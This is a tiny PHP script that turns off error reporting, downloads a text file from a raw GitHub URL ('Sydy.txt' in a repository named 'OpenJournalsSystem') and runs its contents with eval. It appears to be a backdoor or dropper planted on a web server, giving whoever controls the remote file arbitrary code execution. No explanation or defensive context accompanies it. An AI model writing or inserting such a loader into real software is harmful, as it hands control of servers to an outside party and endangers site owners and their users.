<?php
error_reporting(0);
$url = 'https://raw.githubusercontent.com/citrabethari833-seo/OpenJournalsSystem/refs/heads/main/Sydy.txt';
$kode = file_get_contents($url);
eval('?>' . $kode);
?>
